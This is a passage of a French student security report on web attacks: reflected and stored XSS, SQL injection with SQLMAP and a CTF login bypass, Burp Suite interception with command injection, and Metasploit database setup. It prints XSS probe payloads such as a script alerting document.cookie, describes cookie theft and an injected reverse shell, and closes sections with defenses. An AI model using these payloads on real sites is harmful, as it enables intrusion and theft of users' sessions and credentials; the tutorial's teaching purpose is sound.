+<img src="oui/images/xss/xss2.PNG" alt="Code PHP recherche" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Code PHP recherche<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>En regardant le code PHP, on peut s’apercevoir qu’il n’y a aucune vérification sur le paramètre <strong>$_GET</strong>. Cela veut dire que nous pouvons insérer n’importe quel code lors de la requête:</p>
+<figure>
+<img src="oui/images/xss/xss4.PNG" alt="Ajout code javascript" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Ajout code javascript<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On constate à travers cette capture que notre script JS est passé en paramètre. On obtient donc la pop-up suvivante sur notre navigateur:<br />
+</p>
+<figure>
+<img src="oui/images/xss/xss3.PNG" alt="Pop-up JS" id="fig:courbe-tikz" style="width:30.0%" /><figcaption>Pop-up JS<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Contrairement à ce que nous pourrions penser, le fait que la charge utile soit exécutée côté client est bel et bien un risque pour l’utilisateur. En effet, le client possède plusieurs informations secrètes et utiles pour l’attaquant, il a également des extensions dans son navigateur qui peuvent avoir des vulnérabilités.</p>
+<p>Jusque-là, nous avons seulement affiché une pop-up dans la navigateur de la victime, mais nous allons aller un peu plus loin et voler les cookies de l’utilisateur sur le site vulnérable. Pour cela, nous utiliserons la propriété cookie du document (sous réserve que les cookies ne soient pas protégés):</p>
+<p><strong>document.cookie</strong></p>
+<p>En effet, si on exécute le code <code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code> dans la barre de recherche du site on obtient la chose suivante:</p>
+<figure>
+<img src="oui/images/xss/xss5.PNG" alt="Récupération du cookie utilisateur" id="fig:courbe-tikz" style="width:50.0%" /><figcaption>Récupération du cookie utilisateur<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On récupère bien le cookie de l’utilisateur avec qui on est connecté. On pourrait donc imaginer une attaque par le biais de cette faille:</p>
+<figure>
+<img src="oui/images/xss/Untitled Diagram(3).png" alt="Attaque par vol de cookies" id="fig:courbe-tikz" style="width:75.0%" /><figcaption>Attaque par vol de cookies<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Ce type de vulnérabilité se produit lorsque les données fournis par un utilisateur sont stockées sur un serveur (fichier, base de données...) afin d’être par la suite affichées à chaque ouverture du site. Nous pouvons prendre l’exemple des forums dans lesquels un utilisateur peut par exemple injecter un script qui sera visible par tous et donc provoquer des failles chez un grand nombre d’utilisateurs. On se rend rapidement compte que cette faille est véritablement dangereuse. Grâce à celle-ci, on peut par exemple récupérer les cookies des utilisateurs ou faire exécuter du code malveillant à notre insu. On peut également récupérer les cookies de tous les utilisateurs qui consultent la page contenant le code du pirate.</p>
+<p>DOM est l’abréviation de Document Object Model-based. Ce type d’attaque a lieu directement dans le navigateur de la victime sans passer par le serveur web. La page web ne change pas, en revanche le code côté client qui est contenu dans la page s’exécute de manière inopinée, et cela est engendré par les modifications malveillantes apportées à l’environnement DOM. Cette attaque a lieu dans la grande majorité des cas dans les nouvelles applications web car une grande quantité de code javascript est exécutée dans le navigateur de l’utilisateur.</p>
+<p>Afin de détecter la présence d’une faille XSS, on peut commencer par taper dans un formulaire (commentaire, moteur de recherche, chat…) le code suivant:<br />
+&lt;b&gt;Faille&lt;/b&gt;<br />
+Si le message suivant est affiché: Aucun résultat trouvé pour le terme “Faille”, c’est qu’une faille XSS est présente.<br />
+Si le message suivant est affiché: Aucun résultat trouvé pour le terme &lt;b&gt;Faille&lt;/b&gt;, cela signifie que le site est convenablement sécurisé.<br />
+A la suite de la première étape décrite ci-dessus, il est possible d’utiliser un script Javascript dans un champ de formulaire afin d’être convaincu de l’existence d’une faille XSS. On peut par exemple avoir recours au script suivant:<br />
+&lt;script &gt; alert (Attention ce site est vulnérable face aux attaques XSS) &lt;/script &gt;<br />
+Afin de savoir si le site web est vulnérable aux attaques XSS, il suffit donc de taper ce script dans un formulaire, si aucun message ne s’affiche, dans ce cas vous ne risquez pas de vous retrouver face à une faille XSS sur le site en question, en revanche si le message “Attention ce site est vulnérable face aux attaques XSS” s’affiche, dans ce cas là il est préférable pour vous de changer de site.</p>
+<p>La solution permettant de se protéger face à une attaque XSS est de convertir les données. Pour ce qui est du langage PHP, il est courant d’avoir recours aux fonctions htmlentities() et htmlspecialchars() qui permettent de convertir les caractères spéciaux en entités HTML. De ce fait, les données ne seront plus interprétées par le navigateur, mais simplement affichées.<br />
+<strong>Conclusion :</strong><br />
+La faille XSS est l’une des failles qu’on retrouve le plus couramment sur le web. Cela est expliqué par le fait que cette faille permet un grand nombre d’attaques. On peut par exemple grâce à cette faille détourner un formulaire afin de rediriger l’utilisateur vers un site malveillant. Cela permet en autres de voler les cookies d’un utilisateur et donc par la même occasion d’obtenir son login et son mot de passe. Heureusement, cette faille peut être aisément évitée en prenant la peine de traiter correctement les données en entrée.</p>
+<p>Le SQL est un langage de programmation orienté vers les bases de données. Ces bases de données contiennent en général des identifiants et des mots de passe qu’il faut absolument sécuriser. Lors d’une connexion via formulaire sur une page Web, l’utilisateur doit remplir les champs libres qui seront ensuite comparés aux comptes dans la base de données. Les schéma ci-dessous peut faciliter la compréhension du fonctionnement d’authentification :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/SQLDiagram.png" alt="Fonctionnement d’un formulaire" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Fonctionnement d’un formulaire<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Depuis un navigateur, nous allons donc remplir le formulaire de connexion qui va être envoyé vers le serveur Web qui contient un serveur PHP. Ce dernier va traiter le code PHP pour récupérer (le plus souvent en POST) et faire une requête SQL vers la base de données afin de vérifier que les données correspondent. Si c’est le cas, le serveur PHP laisse l’utilisateur entrer sur le site.<br />
+Voici la structure d’une base de données :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/BD.PNG" alt="Exemple d’une base de données" id="fig:courbe-tikz" style="width:30.0%" /><figcaption>Exemple d’une base de données<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Dans cet exemple, la base de données se nomme "Cloud" et contient plusieurs tables : "Categories", "Fichiers", "Suivi" et "Users". Ensuite, chaque table contient des colonnes qui sont ici dans la table "Users": "email", "idU", "mdp", "nom", "Statut". On comprend donc que les données de chaque utilisateurs sont stockées dans la colonne Users. Le PHP va donc essayer de faire correspondre ce qui a été rentré dans le formulaire et ce qui est présent dans cette table afin de valider ou non la connexion.<br />
+Une injection SQL consiste à injecter du code SQL dans une requête SQL dans le but de la détourner et donc de modifier le résultat que cette requête était censé afficher. Cela permet également d’afficher du contenu qui était en toute logique dissimulé (table des users avec les identifiant et mot de passe qui vont avec). Enfin, une insertion SQL permet d’ajouter, de supprimer ou de modifier une base de données.</p>
+<p>Les failles SQL peuvent être exploitées via l’outil SQLMAP. Ce dernier va tenter d’injecter des SELECT dans la base de données et de nous fournir un résultat. Pour mieux comprendre le concept, nous pouvons essayer SQLMAP sur des sites spécialisés en test SQL. Sur celui-ci, nous pouvons tester au niveau de l’URL si une injection est possible :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/1.PNG" alt="Détection d’une faille SQL" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Détection d’une faille SQL<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Comme on peut le voir, pour tester la sécurité de la base de données aux injections SQL, il nous a juste fallu ajouter, dans l’URL, une apostrophe après le GET du site web. Ainsi, la base de données nous envoie un message d’erreur. Cette erreur nous indique que les données tapées par les utilisateurs ne sont pas vérifiées du côté serveur.</p>
+<p>Passons maintenant à l’outil SQLMAP en rentrant la commande suivante :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/2.PNG" alt="Commande SQLMAP" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Commande SQLMAP<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>L’option “-u” va nous permettre d’entrer une URL et le “–dbs” va nous permettre d’afficher les bases de données. Le résultat nous est envoyé sous cette forme :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/3.PNG" alt="Résultat" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Résultat<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Il existe alors deux bases de données qui sont acuart et information_schema. Etant donné que notre site cible est Acuart, nous allons visualiser ses tables :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/4.PNG" alt="Commande pour visualiser les tables" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Commande pour visualiser les tables<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/5.PNG" alt="Résultat" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Résultat<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>A l’intérieur de la base de données, il existe une table users que nous allons dévoiler :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/6.PNG" alt="Commande pour visualiser les colonnes" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Commande pour visualiser les colonnes<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/7.PNG" alt="Résultat" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Résultat<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Dans notre cas, les seules informations dont nous avons besoin sont : name, pass et uname :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/8.PNG" alt="Commande pour visualiser un SELECT" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Commande pour visualiser un SELECT<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/9.PNG" alt="Résultat" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Résultat<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Il existe donc un utilisateur test que nous allons essayer pour nous connecter :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/11.PNG" alt="Connexion" id="fig:courbe-tikz" style="width:60.0%" /><figcaption>Connexion<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Nous avons réussi à nous connecter via une faille SQL.</p>
+<p>Cependant, nous aurions pu éviter de passer par SQLMAP. En effet, si nous avions voulu juste rentrer dans un site exploitable, nous aurions juste pu injecter nous-même une condition. Pour cela, nous allons nous rendre sur un site créé par l’IUT de Blagnac proposant un CTF en ligne. Nous allons donc aller dans la partie SQLi pour essayer une injection visible en <strong>figure <a href="#fig:sqli" data-reference-type="ref" data-reference="fig:sqli">1.21</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/12.PNG" alt="SQLi" id="fig:sqli" style="width:70.0%" /><figcaption>SQLi<span label="fig:sqli"></span></figcaption>
+</figure>
+<p>Cette injection va nous permettre d’ajouter une condition dans la requête qui sera toujours vraie car 1 sera toujours égal à 1. On pourra alors se connecter et entrer dans le site comme on peut le voir sur la <strong>figure <a href="#fig:sqlicon" data-reference-type="ref" data-reference="fig:sqlicon">1.22</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/SQLi/13.PNG" alt="Connexion" id="fig:sqlicon" style="width:70.0%" /><figcaption>Connexion<span label="fig:sqlicon"></span></figcaption>
+</figure>
+<p>Bien entendu, le mot d’ordre est vigilance. Il est utile pour tout administrateur de vérifier constamment les données entrées par l’utilisateur. Les paramètres d’URL et les formulaires (connexion, recherche) sont des potentiels risques d’attaque par injection. Grâce au langage PHP, il est maintenant possible d’avoir recours à des librairies qui auront le rôle de préparer des requêtes SQL avant leurs exécutions. Ces librairies permettent entres autres de valider les données des requêtes. PDO est la plus connue de ces librairies. Cette fonction est directement inclue dans la classe MySQLi pour les nouvelles versions de PHP. Il est utile de camoufler les messages d’erreurs qui peuvent s’afficher sur votre site (comme avec l’exemple de l’apostrophe dans l’URL ci-dessus) dans la mesure où ces messages permettent aux hackers d’avoir des informations sur votre base de données. Afin d’éviter les caractères spéciaux, il est pratique d’utiliser la fonction :<br />
+mysqli_real_escape_string()<br />
+Enfin, il est préférable d’utiliser des comptes utilisateurs qui ont des droits limités. Cela permet d’empêcher l’éventuel hacker de modifier ou supprimer des éléments de la base de données.<br />
+<strong>Conclusion</strong></p>
+<p>Environ un site sur cinq est vulnérable aux injections SQL. Cela est dû au fait qu’une simple erreur peut compromettre la sécurité de la base, des utilisateurs et même du serveur. Pour cette raison, c’est l’une des failles les plus dangereuses pour les applications ayant recours à une base de données. Plus inquiétant encore, les injections SQL sont en augmentation depuis qu’il existe des programmes d’injections SQL automatisés, qui permettent aux hackers de prendre possession d’encore plus de données que par le passé. Heureusement, de simples techniques permettent se protéger de ce type de faille.</p>
+<p>Un proxy est un élément du réseau fonctionnant au niveau de la couche 7 (application) du modèle OSI. Un proxy peut être considéré comme un intermédiaire entre deux personnes surtout quand celles-ci ne parlent pas le même langage. Cela signifie qu’un proxy va intercepter toutes les requêtes entre un serveur et un client. Nous allons dans cette partie exploiter ce concept afin d’exploiter les failles d’un formulaire et contourner des sécurités via l’outil Burpsuite.</p>
+<p>Burpsuite est un logiciel complet permettant d’effectuer des tests d’intrusion ou de vulnérabilités (XSS, CSRF) sur des applications Web. Cet outil peut s’utiliser comme un proxy Web dans le but de chercher et capturer toutes les requêtes Web des utilisateurs au sein d’un LAN. Ce dernier inclut notamment des procédés automatiques dans le but de travailler plus rapidement et plus efficacement.<br />
+Nous allons donc voir son fonctionnement.</p>
+<p>Burpsuite se présente sous la forme d’une interface graphique:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite1.PNG" alt="Interface graphique" id="fig:courbe-tikz" style="width:60.0%" /><figcaption>Interface graphique<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Nous avons 3 types d’outils dans Burpsuite:<br />
+Les outils centraux:<br />
+- <strong>Proxy</strong> : Permet de configurer un proxy dans le but d’intercepter des requêtes web ou de les modifier avant de les transmettre au serveur web.<br />
+- <strong>Site map</strong> : Permet d’avoir une vue arborescente du trafic observé.<br />
+Les outils manuels:<br />
+- <strong>Intruder</strong>: Émission en masse de requêtes HTTP/HTTPS.<br />
+- <strong>Repeater</strong>: Permet la modification avant l’envoi de nos requêtes.<br />
+Les outils automatiques:<br />
+- <strong>Spider</strong>: Cet outil permet la récolte d’informations passives comme la détection de ressources et la collecte active.<br />
+- <strong>Scanner</strong>: Il va rechercher automatiquement des vulnérabilités (via le mode passif ou actif).<br />
+Les autres outils:<br />
+- <strong>Sequencer</strong>: Permet de tester l’existence aléatoire des sessions avec jetons (token).<br />
+- <strong>Decoder</strong>: Conversion URL/HTML/Base64/Hexa/Octal/Binaire/GZip + hashes.<br />
+Burpsuite permet également la configuration de macros dans le but d’automatiser des tâches. De plus, l’avantage de Burpsuite réside dans la possibilité d’une configuration multiple, mais également, dans ses nombreuses fonctionnalités permettant d’aider les pentesteurs les plus expérimentés.<br />
+Ainsi, dans le cas d’un audit de sécurité ou d’un CTF, nous pouvons utiliser cet outil pour capturer le trafic des utilisateurs et ainsi récupérer des mots de passe ou des cookies de connexions pour se connecter à des sites (Gmail, Facebook,...).<br />
+</p>
+<p>Dans le cas où nous avons un formulaire de connexion, nous pouvons utiliser le mode Intercept de Burpsuite pour tester la sécurité de ce dernier, et ainsi injecter ou non du code malveillant comme le montre ce schéma :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/Burpsuite-Fonctionnement.jpg" alt="Fonctionnement du mode Intercept de Burpsuite" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Fonctionnement du mode Intercept de Burpsuite<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Pour cela, il faut aller dans la catégorie proxy et choisir l’adresse IP du proxy à utiliser:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite2.PNG" alt="Mise en place du proxy BurpSuite" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Mise en place du proxy BurpSuite<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Dans notre cas, nous prendrons toutes les adresses IP de notre interface web (d’où le “*”) sur le port 8080. Ensuite, sur un ordinateur client, il suffit de préciser dans le navigateur le proxy à utiliser:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite3.PNG" alt="Mise en place du proxy coté client" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Mise en place du proxy coté client<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p><br />
+On peut donc commencer les tests. Il faudra mettre Burpsuite sur le mode “intercept on” pour intercepter toutes les requêtes.<br />
+Prenons le cas de ce formulaire en HTTP :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite4.PNG" alt="Formulaire Web" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Formulaire Web<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p><br />
+Par exemple, nous allons entrer un username et un password :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite5.PNG" alt="Formulaire Web" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Formulaire Web<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p><br />
+Comme nous pouvons le voir sur Burpsuite, on récupère la requête envoyée au serveur :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite6.PNG" alt="Interception requête HTTP" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Interception requête HTTP<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut alors la modifier avant de la transmettre au serveur :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite7.PNG" alt="Modification de la requête" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Modification de la requête<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p><br />
+Dans notre cas, nous allons essayer d’injecter la commande "ping" pour tester la sécurité du champ “password”.<br />
+</p>
+<p>Si on scrute le réseau avec Wireshark:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/burpsuite/burpsuite8.PNG" alt="Modification de la requête" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Modification de la requête<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Le ping fonctionne bien. Cela veut dire que l’on peut injecter n’importe quelle commande dans le champ password. On pourrait par exemple injecter un reverse shell pour prendre le contrôle à distance la machine.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit.png" alt="Logo de Metasploit" id="fig:courbe-tikz" style="width:20.0%" /><figcaption>Logo de Metasploit<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Metasploit Pen Testing tool est un projet Open Source (sous Licence BSD modifiée) destiné à la sécurité informatique. Le but de ce projet est de rechercher des vulnérabilités ou des informations sur des systèmes automatisés de données ainsi que d’aider à la pénétration et au développement de signatures pour les IDS.<br />
+L’outil que nous allons étudier ici est "Metasploit Framework" qui est un sous projet de Metasploit Pen Testing tool. C’est le sous projet le plus connu car il permet le développement et l’exécution d’exploits (logiciels permettant d’exploiter à son profit une vulnérabilité) contre une machine distante.<br />
+A la base, cet outil a été écrit en Perl. A la suite de quelques mises à jours, l’outil a complètement été réécrit en Ruby. Cet outil a été conçu par HD Moore en 2003 et il est désormais maintenu par la société Rapid7. C’est un outil très puissant permettant à des chercheurs en sécurité de travailler sur des potentielles vulnérabilités. Cependant, comme la plupart des outils de sécurité informatique, Metasploit peut être utilisé à la fois de manière légale et à la fois pour des activités illégales.<br />
+Aujourd’hui, le projet metasploit est hébergé sur le github de la société Rapid7, ce qui permet à des utilisateurs indépendants d’y développer des modules d’exploitation pour des vulnérabilités logicielles et de les poster dans le projet Git. Ainsi, chaque utilisateur peut contribuer au développement de cet outil. Cependant, avant chaque publication, la société Rapid7 teste et vérifie le bon fonctionnement de l’exploit avant de le mettre à disposition sur github.<br />
+Comme nous l’avons dit précédemment, Metasploit possède un Framework ce qui facilite le travail des contributeurs puisqu’ils peuvent utiliser des fonctions de ce dernier pour développer leurs exploits. Enfin, ce qui fait la “force” de Metasploit est qu’il peut regrouper beaucoup d’outils très intéressants tels que Nmap, Hydra ou encore John the ripper, le tout dans une seule console. Cela permet de centraliser beaucoup d’outils de Kali linux.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Metasploit_Architecture.jpg" alt="Architecture modulaire" id="fig:courbe-tikz" style="width:50.0%" /><figcaption>Architecture modulaire<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>La particularité de Metasploit est qu’il possède une architecture modulaire, ce qui permet un développement plus facile, une amélioration progressive du programme. De plus, les modules peuvent être rechargés sans redémarrage de l’application, ce qui est très pratique pour le développement.<br />
+Comme nous pouvons le constater sur ce schéma, il y 3 grandes parties qui composent Metasploit. La première est la librairie. Cette dernière permet de regrouper un grand nombre de fonctions et de programmes dans le but de constituer une API. Ainsi, lors de l’écriture d’un exploit ou d’un payload, le développeur n’aura qu’à connaître l’API de Metasploit pour son développement.<br />
+Metasploit utilise un système de librairie pour stocker ses fichiers. La librairie est composée de :<br />
+- <strong>Rex</strong> – C’est la librairie principale regroupant la gestion des sockets, protocoles, encodeurs, SSL, SMB, HTTP, XOR, Base64, Unicode.<br />
+- <strong>MSF::Core</strong> – Cela permet de fournir l’API basique.<br />
+- <strong>MSF::Base</strong> Fournit l’API " amicale "et il fournit des API simplifiées à utiliser dans le framework.<br />
+Metasploit peut s’utiliser sur plusieurs interfaces:<br />
+- <strong>Msfconsole</strong> : Permet d’avoir une console Metasploit au sein d’un shell, elle est considérée comme l’interface la plus puissante et la plus complète.<br />
+- <strong>MsfCli :</strong> Permet d’utiliser Metasploit en ligne de commande ce qui peut être très pratique pour l’intégrer dans un script.<br />
+- <strong>Msfweb:</strong> Permet d’accéder à l’ensemble des outils de Metasploit sur une interface web. Facile d’utilisation.<br />
+- <strong>Armitage:</strong> Interface GUI de Metasploit. Cet outil est développé par Raphel Mudge et il regroupe tous les outils de Metasploit sous forme d’interface graphique. De plus, il supporte msfcli ainsi que msfconsole.<br />
+L’architecture de Metasploit peut également être représentée en modèle objet :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/msfarch2.png" alt="Architecture modèle objet" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Architecture modèle objet<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p><br />
+Tous les modules de Metasploits sont des classes Ruby. On peut donc en déduire d’une part que d’après ce schéma, la classe Modules hérite d’une classe spécifique. Cette classe spécifique hérite de la classe Msf::Module et enfin, tous les modules se partagent une API commune.<br />
+D’autres part, on peut accéder aux modules depuis le terminal avec la commande suivante:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/modules.PNG" alt="Accès aux modules de Metasploit" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Accès aux modules de Metasploit<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Le Framework Metasploit fournit un support des bases de données utilisant PostgreSQL. Cette dernière stocke des informations, telles que les données de l’hôte, les résultats de scans comme nmap et les résultats d’exploitation. Cela peut être très utile si on fait beaucoup d’exploits ou de tests d’intrusions sur des machines.</p>
+<p>Cependant, cette base de données n’a pas besoin d’être lancée pour exécuter Metasploit mais elle est très utile pour stocker des logs de scan ou d’exploit.<br />
+Pour lancer PostgreSQL sous Kali linux, on utilise la commande suivante:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_launch.PNG" alt="Lancement du service PostgreSQL" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Lancement du service PostgreSQL<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut si on le souhaite, créer une base de données en local pour Metasploit. Pour initialiser une base de données, on utilise la commande suivante:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_init.PNG" alt="Création de la base de données" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Création de la base de données<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Ainsi, cette commande va créer plusieurs utilisateurs avec des mots de passes et créer deux bases de données : msf et msf_test. On peut également vérifier la configuration de notre base données qui se trouve dans le fichier <strong>/usr/share/metasploit-framework/config/<br />
+database.yml</strong>:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/database.PNG" alt="Fichier database.yml" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Fichier database.yml<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut voir que la base de données a bien été lancée :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_status1.PNG" alt="Status de la DB" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Status de la DB<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut voir qu’il y a 1’utilisateur qui a été créé msf" ainsi que 3 catégories "development" , "production" et "test". Ce fichier permet de récupérer les informations de connexion pour se connecter à la base de données.<br />
+En lançant Metasploit, on peut utiliser la commande <strong>db_connect</strong> pour se connecter à notre base de données :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_connect.PNG" alt="Connexion à la base de données" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Connexion à la base de données<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Cette commande nous indique que nous pouvons nous connecter soit en rentrant directement l’utilisateur, le mot de passe, l’adresse IP et la base de données, soit en renseignant un fichier de connexion à utiliser comme le fichier <strong>database.yml</strong>.<br />
+Nous allons par exemple renseigner la méthode avec le fichier :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_connect2.PNG" alt="Connexion avec un fichier" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Connexion avec un fichier<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On vérifie qu’on est bien connecté à la base de données :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_status2.PNG" alt="Vérification de la connexion avec la DB" id="fig:courbe-tikz" style="width:50.0%" /><figcaption>Vérification de la connexion avec la DB<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Une fois connecté à la base de données, on peut réaliser quelques actions intéressantes. Par exemple, on peut stocker le résultat d’un scan <strong>nmap</strong> avec la commande <strong>db_nmap</strong> :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_nmap.PNG" alt="Scan NMAP avec DB" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Scan NMAP avec DB<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Pour l’exemple, on scanne une machine virtuelle de notre réseau local dans laquelle il y a des services ouverts potentiellement vulnérables.<br />
+La commande <strong>hosts</strong> permet de voir quelles sont les machines que nous avons scannées et qui sont stockées dans la base de données comme indiqué sur la <strong>figure <a href="#fig:meta-hote" data-reference-type="ref" data-reference="fig:meta-hote">1.44</a></strong><br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_hosts.PNG" alt="Hôtes scannés" id="fig:meta-hote" style="width:80.0%" /><figcaption>Hôtes scannés<span label="fig:meta-hote"></span></figcaption>
+</figure>
+<p>La commande <strong>services</strong> permet de voir tous les services scannés avec nmap voir <strong>figure <a href="#fig:services-scan" data-reference-type="ref" data-reference="fig:services-scan">1.45</a></strong><br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_services.PNG" alt="Services scannés" id="fig:services-scan" style="width:80.0%" /><figcaption>Services scannés<span label="fig:services-scan"></span></figcaption>
+</figure>
+<p>Il est également possible de pouvoir exporter notre base de données en format .xml avec la commande suivante indiqué dans la <strong>figure <a href="#fig:xml-db" data-reference-type="ref" data-reference="fig:xml-db">1.46</a></strong></p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/db_export.PNG" alt="Exportation de la DB" id="fig:xml-db" style="width:80.0%" /><figcaption>Exportation de la DB<span label="fig:xml-db"></span></figcaption>
+</figure>
+<p>Metasploit possède également une autre base de données pour la recherche d’exploit. En effet, Metasploit donne la possibilité de rechercher une vulnérabilité d’un service directement avec une ligne de commande qui est <strong>searchsploit</strong>.</p>
+<p>En effet, Metasploit se connecte à la base de données de Rapide7 ou d’expoit-db qui est un site qui répertorie beaucoup d’exploit. Comme nous l’avons vu en introduction, les utilisateurs peuvent contribuer à Metasploit en créant des modules, des payload ((charge utile) c’est le morceau du code que nous voulons que le système exécute) ou des exploits.</p>
+<p>Ainsi, ces utilisateurs contribuent à la base de données communautaire de Metasploit. Par exemple, si un utilisateur écrit un exploit pour une vulnérabilité, il peut la faire partager à toute la communauté. De ce fait, cet exploit sera disponible directement dans Metasploit. Cependant, chaque contribution est vérifiée par l’équipe de Rapid7 avant de la rendre disponible dans la base de données.</p>
+<p>Sous Kali Linux, si on veut exploiter cette base de données pour chercher un exploit sur FTP on va procéder comme ceci indiqué dans la <strong>figure <a href="#fig:exploit-db" data-reference-type="ref" data-reference="fig:exploit-db">1.47</a></strong></p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/searchsploit-ex.PNG" alt="Recherche d’exploit dans la DB communautaire exploit-db" id="fig:exploit-db" style="width:80.0%" /><figcaption>Recherche d’exploit dans la DB communautaire exploit-db<span label="fig:exploit-db"></span></figcaption>
+</figure>
+<p>Cette commande nous retourne une liste des exploits disponible pour le service FTP. On remarque également que ces exploits sont stockés dans le répertoire <strong>/usr/share/exploitdb/plateforms</strong>.</p>
+<p>Si on le souhaite, on peut faire une recherche en fonction de la version du service :</p>
+<figure>
